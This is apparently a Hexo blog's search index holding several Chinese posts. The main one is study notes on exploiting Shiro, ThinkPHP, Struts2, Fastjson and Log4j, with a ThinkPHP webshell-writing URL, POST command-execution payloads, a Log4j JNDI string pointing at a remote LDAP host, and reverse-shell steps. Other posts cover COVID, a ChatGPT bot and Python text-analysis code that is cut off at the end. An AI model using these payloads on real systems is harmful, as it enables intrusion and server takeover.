<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>框架及其漏洞</title>
      <link href="/2023/05/25/2023/5/25/"/>
      <url>/2023/05/25/2023/5/25/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Apache-Shiro"><a href="#1-Apache-Shiro" class="headerlink" title="1.Apache Shiro"></a>1.Apache Shiro</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><img src="/2023/05/25/2023/5/25/image-20230525204238959.png"></p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h4><p>1、首先拿到一个登录框，输入信息，勾选Remember Me后提交。</p><p>2、抓包，查看返回的数据包中set-Cookie字段存在remenberme=deleteme(判断存在漏洞)</p><p>3、使用ysoserial中的监听模块，监听6666端口(为第5步拿到密钥做准备)</p><p>4、在自己的电脑上，用nc监听7777端口(为第6步拿到shell做准备)</p><p>5、使用py脚本获取shiro的AES密钥。有了密钥之后，再用py脚本生成payload</p><p>6、最后，重新登录抓包，把包中的cookie值替换为步骤5中的payload，反弹sehll成功</p><h4 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h4><p>1、首先登录网站，并从cookie中获取rememberMe字段(该漏洞必须在登录Shiro的前提下才可能利用成功)</p><p>2、拿到rememberMe cookie后，用它作为Padding Oracle攻击的前缀；</p><p>3、打开ysoserial工具，加密一条Java序列化Payload，构造恶意rememberMe；</p><p>4、最后使用构造好的恶意rememberMe重新请求网站，进行反序列化攻击，最终导致远程代码执行。</p><h2 id="2-ThinkPHP"><a href="#2-ThinkPHP" class="headerlink" title="2.ThinkPHP"></a>2.ThinkPHP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p><img src="/2023/05/25/2023/5/25/image-20230525204632850.png" alt="image-20230525204632850"></p><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><p>1、植入一句话木马(写在url中)</p><p><a href="http://192.168.xx.xx/public/index.php?s=/index/%5Cthink%5Capp/inv">http://192.168.xx.xx/public/index.php?s=/index/\think\app/inv</a></p><p>okefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php </p><p>@eval($_GET[“hack”])?^&gt;&gt;shell.php</p><p>2、显示phpinfo信息(写在url中)</p><p><a href="http://192.168.xx.xx/public/index.php?s=index/%5Cthink%5Capp/invokefunction&amp;function=phpinfo&amp;varv%5B0%5D=100">http://192.168.xx.xx/public/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;varv[0]=100</a></p><p>3、POST利用方法一(写在请求正文中)</p><p>_method=_construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</p><p>4、POST利用方法二(写在请求正文中)</p><p>a=system&amp;b=whoami&amp;_method=filter</p><h2 id="3-Struts2"><a href="#3-Struts2" class="headerlink" title="3.Struts2"></a>3.Struts2</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><img src="/2023/05/25/2023/5/25/image-20230525205440744.png" alt="image-20230525205440744"></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="st2-045"><a href="#st2-045" class="headerlink" title="st2-045"></a>st2-045</h4><p>Struts2默认使用org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类对上传数据进行解析，其在处理Content-Type时如果获得非预期的值的话，将会抛出一个异常。在处理异常的过程中会对错误信息进行OGNL表 达式解析。如果错误信息中包含恶意语句，语句将被执行。</p><h4 id="【重要】S2-062远程命令执行-cve-2021-31805"><a href="#【重要】S2-062远程命令执行-cve-2021-31805" class="headerlink" title="【重要】S2-062远程命令执行(cve-2021-31805)"></a>【重要】S2-062远程命令执行(cve-2021-31805)</h4><p>该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。</p><p>在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。</p><h5 id="原理：开发人员使用-…-语法进行强制"><a href="#原理：开发人员使用-…-语法进行强制" class="headerlink" title="原理：开发人员使用%{…} 语法进行强制"></a>原理：开发人员使用%{…} 语法进行强制</h5><p>OGNL 解析，有一些特殊的TAG属性可以执行二次解析。对不受信任的用户输入使用强制 OGNL 解析</p><p>1、这些 </p><p>UIBean 元素最终对 </p><p>name 属性执行第二次 </p><p>OGNL 评估，</p><p>因为“ value”属性不存在并且它试图填充该属性。因此，通过给所有属性一个空白值 =“” ，这将有助于缓解这个问题。（例如：&lt;s:label</p><p>name= “%{skillName}”value= “” /&gt;</p><p>2、将 org.apache.commons.collection.BeanMap 添加到 Struts2 沙箱的 excludeClasses 列表将排除直接使用它</p><h2 id="4-Fastjson"><a href="#4-Fastjson" class="headerlink" title="4.Fastjson"></a>4.Fastjson</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p><img src="/2023/05/25/2023/5/25/image-20230525210924236.png" alt="image-20230525210924236"></p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>1、只要我们传入一个json类型数据包含@type，程序在调用JSON.parseObject这个方法处理json对象时，程序就会反序列化生成一个对象。因此，了解了Fastjson处理json的机制，攻击者只需要将@type值设为TemplatesImpl，构造一个恶意类，而这个类还有一个字段是_bytecodes，程序根据_bytecodes生成了一个java实例。问题就在于java实例生成的同时，会自动调用构造函数。那么攻击者只要把恶意代码赋值给_bytecodes字段，恶意代码就会执行。</p><p>2、Fastjson 在对 javaBean 进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的 set 方法，如果这个 set 方法中含有些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令。</p><h2 id="5-Apache-Log4j"><a href="#5-Apache-Log4j" class="headerlink" title="5.Apache Log4j"></a>5.Apache Log4j</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Log4j 2.x&lt;★Apache Shiro★=2.14.1</p><h3 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><p>​    黑客在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。</p><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理分三个模块：${…}表达式、log4j的递归解析机制、Jndi注入</p><h4 id="原理一"><a href="#原理一" class="headerlink" title="原理一"></a>原理一</h4><p>MessagePatternConverter类的format()方法一旦遇见日志中包含”${“ ，就会将表达式的内容替换为表达式解析后的内容，而不是表达式</p><p>本身。那么，攻击者只需构造形如”${…}”的表达式，只要表达式符合要求，系统就会执行。</p><h4 id="原理二"><a href="#原理二" class="headerlink" title="原理二"></a>原理二</h4><p>StrSubstitutor类中提取参数并通过lookup对象进行内容替换，当日志遇到”${“时，Interpolator类以” : “号作为分割，将表达式内容分割成两部分。前部分作为prefix(前缀)，后部分作为key(要执行的语句)。然后通过prefix去找对应的lookup对象，通过对应的lookup实例调</p><p>用其自身的方法，最后将key作为参数带入执行。</p><h4 id="原理三"><a href="#原理三" class="headerlink" title="原理三"></a>原理三</h4><p>Jndi注入原理就是poc（写好的代码）中${jndi:ldap://192.168.xx.xx/exp}的jndi变量可控。攻击者远程加载一个恶意class文件，当其中的恶意语句被传入到log4j日志文件时，lookup将恶意语句注入到${jndi:ldap://…}中。接着程序通过ldap协议访问192.168.xx.xx这个地址中包含java代码的class文件，从而达成漏洞利用目的。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1、添加jvm启动参数-D log4j2.formatMsgNoLookups=true</p><p>2、在应用classpath下添加log4j2.component.properties配置文件，</p><p>文件内容为1中的指令。</p><p>3、JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</p><p>4、部署使用第三方防火墙产品进行安全防护。</p>]]></content>
      
      
      
        <tags>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>仍是疫情</title>
      <link href="/2022/12/15/2022/12/%E4%BB%8D%E6%98%AF%E7%96%AB%E6%83%85/"/>
      <url>/2022/12/15/2022/12/%E4%BB%8D%E6%98%AF%E7%96%AB%E6%83%85/</url>
      
        <content type="html"><![CDATA[<p> 恍然间，已经回到了家里</p><p> 回想这几年的魔幻，以及现在的一夜之间，感慨万分</p><p> 人性，无需多言</p><p> 只道是天凉好个秋，希望大家都能平平安安度过这段时期</p><p> <img src="/2022/12/15/2022/12/%E4%BB%8D%E6%98%AF%E7%96%AB%E6%83%85/%E7%99%BD%E4%BA%91.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>chatGPT初体验</title>
      <link href="/2022/12/10/2022/12/chatGPT/"/>
      <url>/2022/12/10/2022/12/chatGPT/</url>
      
        <content type="html"><![CDATA[<p> 捣鼓了两天，现在成功部署这个很火的AI到自己的服务器上了！（bushi）</p><h2 id="官方地址"><a href="#官方地址" class="headerlink" title="官方地址"></a>官方地址</h2><p><a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/Mrs4s/go-cqhttp/issues/1161">https://github.com/Mrs4s/go-cqhttp/issues/1161</a></p><p><a href="https://blog.chrisyy.top/qq-chatGPT.html">https://blog.chrisyy.top/qq-chatGPT.html</a></p><h3 id="centos强制修改DNS"><a href="#centos强制修改DNS" class="headerlink" title="centos强制修改DNS"></a>centos强制修改DNS</h3><p><a href="https://blog.csdn.net/branwel/article/details/102907927">https://blog.csdn.net/branwel/article/details/102907927</a></p><h2 id="成品图"><a href="#成品图" class="headerlink" title="成品图"></a>成品图</h2><p><img src="/2022/12/10/2022/12/chatGPT/image-20221215221114721.png" alt="image-20221215221114721"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>懒得调试了hh，后面官方估计顶不住这么大的访问流量了，bot只能说byebye了</p><p><img src="/2022/12/10/2022/12/chatGPT/image-20221215221244007.png" alt="image-20221215221244007"></p><p>不过还是和他人收获了一些快乐的，也算是一点欣慰</p><p>技术的前沿总是令人向往</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西藏生态-共现网络图</title>
      <link href="/2022/11/28/2022/11/11.28/"/>
      <url>/2022/11/28/2022/11/11.28/</url>
      
        <content type="html"><![CDATA[<p>重力绘图的原理来源</p><h2 id="fruchterman-reingold"><a href="#fruchterman-reingold" class="headerlink" title="fruchterman reingold"></a><strong>fruchterman reingold</strong></h2><p>参考链接</p><p><a href="https://www.zhihu.com/question/21024937">https://www.zhihu.com/question/21024937</a></p><p><a href="https://github.com/gephi/gephi/wiki/Fruchterman-Reingold">https://github.com/gephi/gephi/wiki/Fruchterman-Reingold</a></p><p>现在目前做出的图片效果，关于西藏的生态关键字</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="/2022/11/28/2022/11/11.28/Untitled.png"></p><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><p>微信公众号、微博</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> jieba<br><span class="hljs-keyword">from</span> palettable.colorbrewer.qualitative <span class="hljs-keyword">import</span> Pastel1_7<br><span class="hljs-keyword">from</span> snownlp <span class="hljs-keyword">import</span> SnowNLP<span class="hljs-comment">#中文语言处理模块</span><br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<span class="hljs-comment">#可视化绘制模块 </span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_cut</span>(<span class="hljs-params">text</span>):</span> <br>    <br>    my_words = [<span class="hljs-string">&#x27;西藏&#x27;</span>,<span class="hljs-string">&#x27;环保&#x27;</span>,<span class="hljs-string">&#x27;生态&#x27;</span>,<span class="hljs-string">&#x27;西藏自治区&#x27;</span>]    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> my_words:<br>        jieba.add_word(i)<br>        <br>    <span class="hljs-comment"># 加载停用词</span><br>    stop_words = [] <br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">r&quot;stopwords.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>       lines = f.readlines()<br>       <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>           stop_words.append(line.strip())<br>    <span class="hljs-comment"># stop_words[:10]</span><br>           <br>    <span class="hljs-keyword">return</span> [w <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> jieba.cut(text) <span class="hljs-keyword">if</span> w <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> stop_words <span class="hljs-keyword">and</span> len(w)&gt;<span class="hljs-number">1</span>]<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2csv</span>(<span class="hljs-params">filePath, s, x</span>):</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    将字符串写入到本地csv文件中</span><br><span class="hljs-string">    :param filePath: csv文件路径</span><br><span class="hljs-string">    :param s: 待写入字符串(逗号分隔格式)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27;node&#x27;</span>:<br>        <span class="hljs-keyword">with</span> open(filePath, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;gbk&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&quot;Label,Weight\r&quot;</span>)<br>            f.write(s)<br>        print(<span class="hljs-string">&#x27;写入文件成功,请在&#x27;</span>+filePath+<span class="hljs-string">&#x27;中查看&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">with</span> open(filePath, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;gbk&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&quot;Source,Target,Weight\r&quot;</span>)<br>            f.write(s)<br>        print(<span class="hljs-string">&#x27;写入文件成功,请在&#x27;</span>+filePath+<span class="hljs-string">&#x27;中查看&#x27;</span>)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sortDictValue</span>(<span class="hljs-params">dict, is_reverse</span>):</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    将字典按照value排序</span><br><span class="hljs-string">    :param dict: 待排序的字典</span><br><span class="hljs-string">    :param is_reverse: 是否按照倒序排序</span><br><span class="hljs-string">    :return s: 符合csv逗号分隔格式的字符串</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment"># 对字典的值进行倒序排序,items()将字典的每个键值对转化为一个元组,key输入的是函数,item[1]表示元组的第二个元素,reverse为真表示倒序</span><br>    tups = sorted(dict.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=is_reverse)<br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> tup <span class="hljs-keyword">in</span> tups:  <span class="hljs-comment"># 合并成csv需要的逗号分隔格式</span><br>        s = s + tup[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;,&#x27;</span> + str(tup[<span class="hljs-number">1</span>]) + <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_matrix</span>(<span class="hljs-params">co_authors_list, is_reverse</span>):</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    根据共同列表,构建共现矩阵(存储到字典中),并将该字典按照权值排序</span><br><span class="hljs-string">    :param co_authors_list: 共同列表</span><br><span class="hljs-string">    :param is_reverse: 排序是否倒序</span><br><span class="hljs-string">    :return node_str: 三元组形式的节点字符串(且符合csv逗号分隔格式)</span><br><span class="hljs-string">    :return edge_str: 三元组形式的边字符串(且符合csv逗号分隔格式)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    node_dict = &#123;&#125;  <span class="hljs-comment"># 节点字典,包含节点名+节点权值(频数)</span><br>    edge_dict = &#123;&#125;  <span class="hljs-comment"># 边字典,包含起点+目标点+边权值(频数)</span><br>    <span class="hljs-comment"># 第1层循环,遍历整表的每行信息</span><br>    <span class="hljs-keyword">for</span> row_authors <span class="hljs-keyword">in</span> co_authors_list:<br>        row_authors_list = row_authors.split(<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment"># 依据&#x27;,&#x27;分割每行,存储到列表中</span><br>        <span class="hljs-comment"># 第2层循环</span><br>        <span class="hljs-keyword">for</span> index, pre_au <span class="hljs-keyword">in</span> enumerate(row_authors_list): <span class="hljs-comment"># 使用enumerate()以获取遍历次数index</span><br>            <span class="hljs-comment"># 统计单个词出现的频次</span><br>            <span class="hljs-keyword">if</span> pre_au <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> node_dict:<br>                node_dict[pre_au] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                node_dict[pre_au] += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># 若遍历到倒数第一个元素,则无需记录关系,结束循环即可</span><br>            <span class="hljs-keyword">if</span> pre_au == row_authors_list[<span class="hljs-number">-1</span>]:<br>                <span class="hljs-keyword">break</span><br>            connect_list = row_authors_list[index+<span class="hljs-number">1</span>:]<br>            <span class="hljs-comment"># 第3层循环,遍历当前行词后面所有的词,以统计两两词出现的频次</span><br>            <span class="hljs-keyword">for</span> next_au <span class="hljs-keyword">in</span> connect_list:<br>                A, B = pre_au, next_au<br>                <span class="hljs-comment"># 固定两两词的顺序</span><br>                <span class="hljs-comment"># 仅计算上半个矩阵</span><br>                <span class="hljs-keyword">if</span> A==B:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> A &gt; B:<br>                    A, B = B, A<br>                key = A+<span class="hljs-string">&#x27;,&#x27;</span>+B  <span class="hljs-comment"># 格式化为逗号分隔A,B形式,作为字典的键</span><br>                <span class="hljs-comment"># 若该关系不在字典中,则初始化为1,表示词间的共同出现次数</span><br>                <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> edge_dict:<br>                    edge_dict[key] = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    edge_dict[key] += <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 对得到的字典按照value进行排序</span><br>    node_str = sortDictValue(node_dict, is_reverse)  <span class="hljs-comment"># 节点</span><br>    edge_str = sortDictValue(edge_dict, is_reverse)   <span class="hljs-comment"># 边</span><br>    <span class="hljs-keyword">return</span> node_str, edge_str<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">snowanalysis</span>(<span class="hljs-params">textlist</span>):</span><br>    sentimentslist = []<br>    <span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">in</span> textlist:<br>        textlist.remove(<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#移除空评论</span><br>    <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> textlist:<br>        s = SnowNLP(li)<br>        <span class="hljs-comment">#print(s.sentiments)</span><br>        sentimentslist.append(s.sentiments)<br>    <span class="hljs-comment">#print(sentimentslist)</span><br>    <span class="hljs-comment"># plt.xlabel(&#x27;情感值&#x27;)</span><br>    <span class="hljs-comment"># plt.ylabel(&#x27;主题&#x27;)</span><br>    <span class="hljs-comment"># # # print(sentimentslist)</span><br>    <span class="hljs-comment"># plt.figure(&quot;sentiment&quot;)</span><br>    <span class="hljs-comment"># plt.hist(sentimentslist,bins=np.arange(0,1,0.02))</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># # 设置字体为楷体</span><br>    <span class="hljs-comment"># plt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;KaiTi&#x27;]</span><br>    <span class="hljs-comment"># plt.xlabel(&#x27;情感值&#x27;)</span><br>    <span class="hljs-comment"># plt.ylabel(&#x27;主题&#x27;)</span><br>    <span class="hljs-comment"># plt.title(&#x27;不同主题下的情感得分柱形图&#x27;)</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># # for x, y in enumerate(sentimentslist):</span><br>    <span class="hljs-comment"># #     plt.text(y, x, &#x27;%s&#x27; % y, va=&#x27;center&#x27;)</span><br>    <span class="hljs-comment"># plt.show()</span><br><br>    plt.rcParams[<span class="hljs-string">&#x27;font.sans-serif&#x27;</span>] = <span class="hljs-string">&#x27;simhei&#x27;</span><br>    plt.rcParams[<span class="hljs-string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="hljs-literal">False</span><br>    正向评论_positive = <span class="hljs-number">0</span><br>    负向评论_negative = <span class="hljs-number">0</span><br>    中性评论_neutral = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(textlist)):<br>        <span class="hljs-keyword">if</span> float(sentimentslist[i]) &gt;= <span class="hljs-number">0.45</span> <span class="hljs-keyword">and</span> float(sentimentslist[i]) &lt;= <span class="hljs-number">0.55</span>:<br>            中性评论_neutral += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> float(sentimentslist[i]) &gt; <span class="hljs-number">0.55</span>:<br>            正向评论_positive += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> float(sentimentslist[i]) &lt; <span class="hljs-number">0.45</span>:<br>            负向评论_negative += <span class="hljs-number">1</span><br>    <span class="hljs-comment"># print(正向评论_positive)</span><br>    <span class="hljs-comment"># print(负向评论_negative)</span><br>    <span class="hljs-comment"># print(中性评论_neutral)</span><br>    x = [<span class="hljs-string">&#x27;正向评论_positive&#x27;</span>, <span class="hljs-string">&#x27;负向评论_negative&#x27;</span>, <span class="hljs-string">&#x27;中性评论_neutral&#x27;</span>]<br>    y = [正向评论_positive, 负向评论_negative, 中性评论_neutral]<br>    plt.pie(y, pctdistance=<span class="hljs-number">0.85</span>, autopct=<span class="hljs-string">&#x27;%.1f%%&#x27;</span>, labels=x,<br>            colors=Pastel1_7.hex_colors,<br>            wedgeprops=dict(width=<span class="hljs-number">0.3</span>, edgecolor=<span class="hljs-string">&#x27;w&#x27;</span>))<br>    plt.legend(x, loc=[<span class="hljs-number">0.8</span>,<span class="hljs-number">0.8</span>])<br>    plt.title(<span class="hljs-string">&#x27;情感分类环形图&#x27;</span>)<br>    plt.savefig(<span class="hljs-string">&#x27;D:/Desktop/&#x27;</span> + <span class="hljs-string">&#x27;情感分类环形图&#x27;</span>)<br>    plt.show()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># os.chdir(r&#x27;C:\Users\Administrator\Desktop&#x27;)</span><br>    filePath1 = <span class="hljs-string">r&#x27;node.csv&#x27;</span><br>    filePath2 = <span class="hljs-string">r&#x27;edge.csv&#x27;</span><br>    <span class="hljs-comment"># 读取csv文件获取数据并存储到列表中</span><br>    df = pd.read_excel(<span class="hljs-string">&#x27;huizong.xlsx&#x27;</span>)<br>    <span class="hljs-comment"># print(df)</span><br>    df_ = [w <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> df[<span class="hljs-string">&#x27;高频词&#x27;</span>]]<br>    print(df[<span class="hljs-number">0</span>:<span class="hljs-number">21</span>])<br>    <span class="hljs-comment"># print(df_)</span><br>    <span class="hljs-comment"># snowanalysis(df_)</span><br>    <span class="hljs-comment"># co_ist = [ &quot; &quot;.join(my_cut(w)) for w in df_] </span><br>    <span class="hljs-comment"># print(co_ist)</span><br>    <span class="hljs-comment"># # 根据共同词列表, 构建共现矩阵(存储到字典中), 并将该字典按照权值排序</span><br>    <span class="hljs-comment"># node_str, edge_str = build_matrix(co_ist, is_reverse=True)</span><br>    <span class="hljs-comment"># print(edge_str)</span><br>    <span class="hljs-comment"># # 将字符串写入到本地csv文件中</span><br>    <span class="hljs-comment"># str2csv(filePath1,node_str,&#x27;node&#x27;)</span><br>    <span class="hljs-comment"># str2csv(filePath2,edge_str,&#x27;edge&#x27;)</span><br>    <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 